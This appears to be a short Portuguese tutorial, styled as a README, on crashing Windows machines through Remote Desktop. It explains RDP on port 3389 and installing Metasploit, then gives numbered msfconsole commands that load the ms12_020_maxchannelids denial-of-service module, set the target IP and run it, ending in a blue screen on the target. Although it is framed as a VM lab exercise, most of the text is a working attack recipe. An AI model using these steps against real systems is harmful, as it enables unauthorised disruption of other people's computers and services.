# Ataques_DoS_no_Windows_RDP

## Negação de Serviço 

- RDP é abreviação de Remote Desktop Protocol, opção de controle remoto para computadores windwos!

### O serviço de RDP pode ser configurado por Administradores de sistemna Windows para ser executado nas seguintes portas.

- TCP ( utilizando a porta 3389) ou
- UDP (utilizando a porta 3389)

## Para simular o ataque vamos precisar de um kali linux com metasploit instalado e um Windows em VM (Maquina virtual)

- Na mauqina que vai ser atacada tem que estar ativado o RDP, e preciosamos saber o IP desse dispositivo. 

- No kali Linux precisamos estar em root 

## intalação do Metasploit

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
 ```

1 comando

```bash
 msfconsole 
 ```

2 comando

```bash
search rdp
 ```

3 Comando

```bash
auxiliary/dos/windows/rdp/ms12_020_maxchannelids
 ```

4 Comando 
```bash
set rhosts (mais IP)
 ```

 5 Comando 
```bash
run
 ```

# após rodar criamos uma tela azul no Windows! 
